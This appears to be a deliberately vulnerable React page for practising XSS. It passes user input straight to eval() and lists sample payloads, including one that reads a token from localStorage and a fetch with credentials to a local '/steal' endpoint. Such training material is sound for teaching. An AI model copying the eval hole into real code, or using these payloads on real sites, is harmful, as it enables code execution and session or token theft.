'use client';

import { useState } from 'react';

export default function Home() {
  const [inputValue, setInputValue] = useState('');
  const [output, setOutput] = useState('');

  const handleInputChange = (event) => {
    setInputValue(event.target.value);
  };

  const handleSubmit = (event) => {
    event.preventDefault();
    try {
      eval(inputValue);
      setOutput('Script executed successfully.');
    } catch (error) {
      setOutput('Error executing script: ' + error.message);
    }
  };

  const xssSamples = [
    'alert("XSS")',
    'alert(localStorage.getItem("token"))',
    'fetch("http://localhost:3001/steal", {credentials: "include"})',
  ];

  return (
    <div>
      <h1>Welcome to the vulnerable app</h1>
      <form onSubmit={handleSubmit}>
        <label>
          Enter some text:
          <textarea
            value={inputValue}
            onChange={handleInputChange}
            rows={10}
            cols={50}
          />
        </label>
        <button type="submit">Submit</button>
      </form>
      <div>
        <h2>Output:</h2>
        <div>{output}</div>
      </div>
      <div>
        <h2>XSS Samples:</h2>
        <ul>
          {xssSamples.map((sample, index) => (
            <li key={index}>
              <code>{sample}</code>
            </li>
          ))}
        </ul>
      </div>
    </div>
  );
}
